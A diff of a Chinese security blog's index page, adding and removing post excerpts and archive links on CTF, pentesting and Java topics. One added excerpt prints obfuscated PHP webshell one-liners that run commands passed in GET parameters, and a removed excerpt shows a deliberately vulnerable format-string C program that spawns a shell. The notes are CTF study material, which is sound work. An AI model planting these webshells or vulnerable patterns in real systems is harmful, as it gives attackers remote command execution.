@@ -354,6 +354,76 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href="/posts/5109/">
+            
+                <span>php-命令执行</span>
+        </a>
+        <div class="abstract-content">
+            
+webshell
+
+123456&lt;?=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);=&gt; $_GET[_]($_GET[__]);=&gt;&lt;?=`&#123;$&#123;~"����"&#125;[_]&#125;`;// echo -ne '&lt;?=`&#123;$&#123;~"\xa0\xb8\xba\xab"&#125;[_]&#125;`;'
+
+写文件&amp;读文件
+
+php的标签&lt;?php存在字母肯定不行，尝试&lt;?发现不解析，...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/18</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/62555/">
+            
+                <span>RSA学习</span>
+        </a>
+        <div class="abstract-content">
+            openssl相关操作提取pubkey.pem相关信息
+1openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem
+解密:
+1openssl rsautl -decrypt -in 【flag.enc】 -inkey 【private.pem】
+已知p,q若已知质数p和q，则通过依次计算欧拉函数值phi、私钥d可解密。在选取加密指数e时要求phi，e互质，也就是gcd(phi,e)==1 ，如果不满足是无法直接解密的。
+123456789def rsa_decrypt(e, c, p, q):    phi = (p - 1)...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/17</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href="/posts/28940/">
             
                 <span>ssti</span>
@@ -611,71 +681,6 @@ man命令允许执行命令
             <!-- date  -->
             <div class="abstract-date">
                 <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/21</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/54865/">
-            
-                <span>python多线程和lock和Rlock</span>
-        </a>
-        <div class="abstract-content">
-            在threading模块中，定义两种类型的琐：threading.Lock和threading.RLock。
-RLock允许在同一线程中被多次acquire。而Lock却不允许这种情况。注意：如果使用RLock，那么acquire和release必须成对出现，即调用了n次acquire，必须调用n次的release才能真正释放所占用的琐。
-rlock只能在同一个线程acquire和release
-lock可以在不同的线程acquire和release
-rlock的作用: 在递归程序中，可能会需要重复的acuqire,release，这时候，就必须要使用rlock。
-
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/14</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="python">python</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/54897/">
-            
-                <span>linux格式化字符串漏洞</span>
-        </a>
-        <div class="abstract-content">
-            格式化漏洞漏洞代码:123456789101112131415#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void win()&#123;system("/bin/sh");&#125;void main(int argc, char *argv[])&#123;char buf[103];fgets(buf, 103, stdin);buf[strlen(buf)-1] = 0x0;printf(buf);exit(0);&#125;
-编译
-gcc -Wno-format-secur...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/08</span>
             </div>
             <!-- tags  -->
             
@@ -1618,9 +1623,59 @@ gcc -Wno-format-secur...
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 52
+        Total : 54
         </div>
         <!-- search  -->
         
@@ -1633,6 +1688,11 @@ gcc -Wno-format-secur...
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/posts/11284/">jvm-java虚拟机如何运行java字节码</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1662,6 +1722,11 @@ gcc -Wno-format-secur...
     
         <li class="archive-post-item">
             <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/11234/">dubbo-启动</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
         </li>
     
     
@@ -1696,12 +1761,12 @@ gcc -Wno-format-secur...
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
         </li>
     
     
@@ -1811,12 +1876,12 @@ gcc -Wno-format-secur...
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
@@ -1899,15 +1964,17 @@ gcc -Wno-format-secur...
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
-    
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
@@ -1922,6 +1989,8 @@ gcc -Wno-format-secur...
         <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
         <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
